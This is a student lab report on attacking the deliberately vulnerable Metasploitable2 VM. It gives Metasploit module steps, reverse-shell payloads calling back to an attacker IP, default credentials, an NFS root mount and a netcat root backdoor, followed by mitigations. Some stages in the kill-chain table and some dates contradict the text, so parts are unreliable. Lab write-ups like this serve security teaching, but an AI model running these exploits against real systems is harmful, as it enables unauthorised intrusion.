# Metasploitable2 Exploitation Report

**Name:** Fawaz Rufai Mohammed

**Index Number:** 7357623

**Date:** September 21, 2026

**Target IP:** 192.168.1.3

**Attacker OS / Tools:** Kali Linux, Metasploit Framework, Nmap

---

## Reconnaissance Summary

Initial network discovery and port scanning against the target VM at `192.168.1.3` revealed numerous intentionally vulnerable services spanning FTP, SSH, Telnet, SMTP, DNS, HTTP/Tomcat, SMB, PostgreSQL, VNC, and IRC. All evidence screenshots referenced below are stored in `evidence/` alongside this report.

---

## Exploit 1: vsftpd 2.3.4 Backdoor

* **Service / Port:** FTP / 21
* **Vulnerability:** vsftpd 2.3.4 Smiley Face Backdoor
* **Tool Used:** Metasploit — `exploit/unix/ftp/vsftpd_234_backdoor`
* **Why This Tool:** This module is purpose-built to trigger the backdoor embedded in the version 2.3.4 source code release, which opens a listening shell on port 6200 upon receiving a specific smiley face character (`:)`) in the username field.
* **Steps:**
  1. Manually connected to FTP (`ftp 192.168.1.3`) and confirmed the vulnerable banner `220 (vsFTPd 2.3.4)` via anonymous login.
  2. Started `msfconsole` and searched for the module: `search vsftpd`.
  3. Selected the exploit: `use exploit/unix/ftp/vsftpd_234_backdoor`.
  4. Set the target IP: `set RHOSTS 192.168.1.3`.
  5. Set the local attacking IP: `set LHOST 192.168.1.4`.
  6. Ran the exploit (`run`) — the module auto-detected the vulnerable banner and spawned a Meterpreter session.
  7. Verified access with `getuid` (returned `root`).
* **Evidence:** `evidence/exploit1.png` (Meterpreter session opened, `getuid` → root). Banner confirmation: `evidence/exploit2.png` (anonymous FTP login showing the vulnerable 2.3.4 banner).
* **Cyber Kill Chain Stage(s):** Exploitation, C2
* **Outcome / Impact:** Root-level access achieved instantly through the unauthenticated command execution flaw. Session confirmed with `getuid` returning `root`.

---

## Exploit 2: Samba Usermap Script Execution

* **Service / Port:** SMB / 139, 445
* **Vulnerability:** Samba 3.0.20 Username Map Script Execution
* **Tool Used:** Metasploit — `exploit/multi/samba/usermap_script`
* **Why This Tool:** The module exploits a vulnerability in Samba's username map script configuration option, allowing arbitrary shell commands to be injected via crafted usernames containing shell meta-characters.
* **Steps:**
  1. Selected the module: `use exploit/multi/samba/usermap_script`.
  2. Set the target: `set RHOSTS 192.168.1.3`.
  3. Set the local host: `set LHOST 192.168.1.4`.
  4. Set the payload explicitly: `set PAYLOAD cmd/unix/reverse_netcat`.
  5. Ran the module (`run`) — a command shell session opened at `2026-09-28 18:25:37`.
  6. Verified identity with `whoami` (→ `root`) and `id` (→ `uid=0(root) gid=0(root)`).
* **Evidence:** `evidence/exploit4.png`
* **Cyber Kill Chain Stage(s):** Exploitation, Actions on Objectives
* **Outcome / Impact:** Full root shell access obtained on the target machine, confirmed via `whoami`/`id`.

---

## Exploit 3: UnrealIRCd Backdoor Command Execution — Unsuccessful

* **Service / Port:** IRC / 6667
* **Vulnerability:** UnrealIRCd 3.2.8.1 Backdoor Command Execution
* **Tool Used:** Metasploit — `exploit/unix/irc/unreal_ircd_3281_backdoor`
* **Why This Tool:** A backdoor was maliciously inserted into the official UnrealIRCd 3.2.8.1 download archives, which is intended to execute any command sent following the `AB;` trigger sequence.
* **Steps:**
  1. Searched and selected the module: `search unreal` → `use exploit/unix/irc/unreal_ircd_3281_backdoor`.
  2. Set `RHOSTS 192.168.1.3` and `LHOST 192.168.1.4`.
  3. Ran the module — Metasploit registered a fake IRC user (`clark`) and reported the target as vulnerable ("UnrealIRCd detected via IRC commands"), sent the backdoor command, but returned **"Exploit completed, but no session was created."**
  4. Set `PAYLOAD cmd/unix/reverse` and `ExitOnSession false`, then re-ran with a second fake user (`nora`) — same vulnerable detection, same result: no session created.
* **Evidence:** `evidence/exploit3.png`
* **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation *(not achieved: Installation, C2, Actions on Objectives)*
* **Outcome / Impact:** The service was confirmed vulnerable (banner/detection check passed) and the backdoor trigger was sent twice, but **no working shell was obtained** in this run. No code execution was demonstrated.

---

## Exploit 4: Tomcat Manager Application Deployment — Unsuccessful

* **Service / Port:** HTTP / 8180
* **Vulnerability:** Apache Tomcat Manager Weak Credentials / WAR Deployment
* **Tool Used:** Metasploit — `exploit/multi/http/tomcat_mgr_upload`
* **Why This Tool:** The target ran Tomcat with default administrative credentials (`tomcat:tomcat`), which the module uses to programmatically upload and deploy a malicious WAR payload via the Manager application.
* **Steps:**
  1. Selected the module: `use exploit/multi/http/tomcat_mgr_upload`.
  2. Set `RHOSTS 192.168.1.3`, `RPORT 8180`, `HttpUsername tomcat`, `HttpPassword tomcat`, and `LHOST 192.168.1.4`.
  3. Ran the module — it authenticated successfully, uploaded and deployed a WAR (`Ol2UvMzRkWqozwfktX4`), then automatically undeployed it, returning **"Exploit completed, but no session was created."**
* **Evidence:** `evidence/exploit6.png`
* **Cyber Kill Chain Stage(s):** Exploitation *(authentication succeeded)*, Installation *(WAR uploaded/deployed)* — **not achieved: C2**
* **Outcome / Impact:** Default administrative credentials were confirmed valid and a malicious WAR was successfully deployed to the server, but **no reverse shell session was captured** in this run.

---

## Exploit 5: PostgreSQL Payload Execution

* **Service / Port:** PostgreSQL / 5432
* **Vulnerability:** PostgreSQL Trusted Language UDF Execution / Default Credentials
* **Tool Used:** Metasploit — `exploit/linux/postgres/postgres_payload`
* **Why This Tool:** The database allowed administrative login using default credentials (`postgres:postgres`), enabling upload of a shared object (`.so`) to execute system-level commands.
* **Steps:**
  1. Selected the module: `use exploit/linux/postgres/postgres_payload`.
  2. Set `RHOSTS 192.168.1.3`, `USERNAME postgres`, `PASSWORD postgres`, `LHOST 192.168.1.4`.
  3. Ran the module — uploaded `/tmp/CApNekeB.so` and opened Meterpreter session 3 at `2026-09-28 18:39:00`.
  4. Confirmed access with `getuid` (→ `postgres`) and `sysinfo` (Metasploitable, Ubuntu 8.04, i686).
* **Evidence:** `evidence/exploit7.png`
* **Cyber Kill Chain Stage(s):** Exploitation, C2
* **Outcome / Impact:** System access obtained under the `postgres` security context, confirmed via `getuid`/`sysinfo`.

---

## Exploit 6: DistCC Daemon Command Execution

* **Service / Port:** DistCC / 3632
* **Vulnerability:** DistCC Daemon Remote Code Execution
* **Tool Used:** Metasploit — `exploit/unix/misc/distcc_exec`
* **Why This Tool:** The DistCC daemon accepted arbitrary compilation jobs without access restrictions, allowing direct command execution through job arguments.
* **Steps:**
  1. Selected the module: `use exploit/unix/misc/distcc_exec`, set `RHOSTS 192.168.1.3` and `LHOST 192.168.1.4`.
  2. First run used the default payload (`cmd/unix/reverse_bash`) — this failed (`stderr: bash: 215: Bad file descriptor`, no session created).
  3. Switched payload: `set PAYLOAD cmd/unix/reverse_perl`, re-ran the module — a command shell session opened at `2026-09-28 18:42:39`.
  4. Verified access with `whoami` (→ `daemon`) and `id` (→ `uid=1(daemon) gid=1(daemon)`).
  5. Pivoted to further enumeration: ran `showmount -e 192.168.1.3` to list NFS exports, mounted the exported root share (`sudo mount -t nfs 192.168.1.3:/ /mnt/nfs`), and listed its full contents (`ls -la /mnt/nfs`) before unmounting.
* **Evidence:** `evidence/exploit8.png` (shell access as `daemon`). NFS enumeration: `evidence/exploit9.png`.
* **Cyber Kill Chain Stage(s):** Exploitation, Actions on Objectives
* **Outcome / Impact:** Daemon-level code execution obtained (after switching payloads), followed by full filesystem enumeration via an exposed NFS share mounted from the attacker box.

---

## Exploit 7: VNC Authentication Bypass & Session Access

* **Service / Port:** VNC / 5900
* **Vulnerability:** Weak/Default VNC Authentication
* **Tool Used:** Metasploit auxiliary scanner (`auxiliary/scanner/vnc/vnc_login`) & `vncviewer`
* **Why This Tool:** Used to brute-force/verify weak authentication and then directly inspect the live remote desktop of the target server.
* **Steps:**
  1. Selected and ran the scanner: `use auxiliary/scanner/vnc/vnc_login`, `set RHOSTS 192.168.1.3`, `run` — recovered the password **`password`** ("Login Successful: :password").
  2. First connection attempt (`vncviewer 192.168.1.3`) without the password failed ("Authentication failure").
  3. Reconnected and supplied the recovered password — authentication succeeded, revealing desktop name `"root's X desktop (metasploitable:0)"`.
* **Evidence:** `evidence/exploit10.png` (scanner result + successful vncviewer authentication). Visual confirmation of the live session: `evidence/exploit10_evidence.png` (VirtualBox screenshot showing the open root shell inside the VNC desktop window).
* **Cyber Kill Chain Stage(s):** Exploitation, Actions on Objectives
* **Outcome / Impact:** Full graphical administrative desktop session control (root's X desktop) confirmed visually.

---

## Exploit 8: Telnet Service Enumeration and Unauthorized Access — Evidence Not Captured

* **Service / Port:** Telnet / 23
* **Vulnerability:** Unencrypted Cleartext Management Protocol / Default Accounts
* **Tool Used:** Metasploit / Netcat
* **Why This Tool:** Telnet transmits all traffic, including credentials, in cleartext, making it trivial to access services using default configuration accounts.
* **Planned Steps:** Identify the active Telnet service, connect on port 23, authenticate with known default credentials, and verify command-line execution privileges.
* **Evidence:** ⚠️ No screenshot matching this technique was found among the files provided — none of the uploaded images show a Telnet session.
* **Outcome / Impact:** Not demonstrated in this evidence set.

---

## Exploit 9: SSH Weak Credential Reuse — Evidence Not Captured

* **Service / Port:** SSH / 22
* **Vulnerability:** Default Account Credentials (`msfadmin:msfadmin`)
* **Tool Used:** Standard SSH Client / Metasploit Auxiliary Scanners
* **Why This Tool:** Tests SSH configurations against known default user profiles bundled with the test environment.
* **Planned Steps:** Attempt SSH login with default credentials and establish an encrypted interactive session.
* **Evidence:** ⚠️ No screenshot matching this technique was found among the files provided — none of the uploaded images show an SSH session.
* **Outcome / Impact:** Not demonstrated in this evidence set.

---

## Exploit 10: HTTP Web Directory Traversal / File Inclusion — Evidence Not Captured

* **Service / Port:** HTTP / 80
* **Vulnerability:** Vulnerable Web Application Components (DVWA / Mutillidae)
* **Tool Used:** Custom HTTP requests / Browser tools
* **Why This Tool:** Used to evaluate application-layer security controls and uncover sensitive configuration files on the web server root.
* **Planned Steps:** Browse internal web application paths on port 80 and trigger path traversal sequences to access system configuration files.
* **Evidence:** ⚠️ No screenshot matching this technique was found among the files provided — none of the uploaded images show a web traversal / DVWA / Mutillidae session.
* **Outcome / Impact:** Not demonstrated in this evidence set.

---

## Additional Finding: Port 1524 Backdoor Shell

* **Service / Port:** TCP / 1524 ("ingreslock" backdoor)
* **Observation:** A direct netcat connection (`nc 192.168.1.3 1524`) returned an interactive root shell without authentication, confirmed via `whoami` and `id` (`uid=0(root) gid=0(root) groups=0(root)`).
* **Evidence:** `evidence/exploit5.png`
* **Note:** This is a known pre-existing backdoor on Metasploitable2 not tied to any single module above; it is documented here as a bonus finding.

---

## Kill Chain Coverage Summary

| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
| --- | --- | --- | --- | --- | --- | --- | --- |
| 1. vsftpd 2.3.4 Backdoor | ✔ | ✔ | ✔ | ✔ |  | ✔ | ✔ |
| 2. Samba Usermap Script | ✔ | ✔ | ✔ | ✔ |  | ✔ | ✔ |
| 3. UnrealIRCd Backdoor *(unsuccessful)* | ✔ | ✔ | ✔ | ✔ |  |  |  |
| 4. Tomcat Manager Upload *(no session)* | ✔ | ✔ | ✔ | ✔ | ✔ |  |  |
| 5. PostgreSQL Payload | ✔ | ✔ | ✔ | ✔ |  | ✔ | ✔ |
| 6. DistCC Daemon Exec | ✔ | ✔ | ✔ | ✔ |  |  | ✔ |
| 7. VNC Authentication | ✔ | ✔ | ✔ | ✔ |  |  | ✔ |
| 8. Telnet Access *(no evidence)* | — | — | — | — | — | — | — |
| 9. SSH Default Login *(no evidence)* | — | — | — | — | — | — | — |
| 10. Web Path Traversal *(no evidence)* | — | — | — | — | — | — | — |

---

## Lessons Learned / Mitigations

1. **Disable Unnecessary Services & Default Credentials:** Many of the vulnerabilities exploited (PostgreSQL, Tomcat, VNC) relied on default passwords or insecure sample applications. Enforcing strict, complex password policies and disabling unneeded daemon instances dramatically reduces attack surface.
2. **Patch Management and Software Auditing:** Services like `vsftpd 2.3.4`, `UnrealIRCd 3.2.8.1`, and `Samba 3.0.20` contained known source-level backdoors or critical RCE flaws. Regular updates and vulnerability scanning eliminate these historical exploits entirely.
3. **Network Segmentation and Firewalls:** Restricting administrative ports (Telnet, VNC, database ports, NFS) behind secure VPNs or internal VLAN firewalls prevents unauthorized external scanning and exploitation attempts.
4. **Not every exploit attempt succeeds:** The UnrealIRCd and Tomcat modules confirmed the underlying vulnerabilities existed but failed to return a working session in this run — a reminder that vulnerability confirmation and successful exploitation are distinct outcomes worth documenting separately.
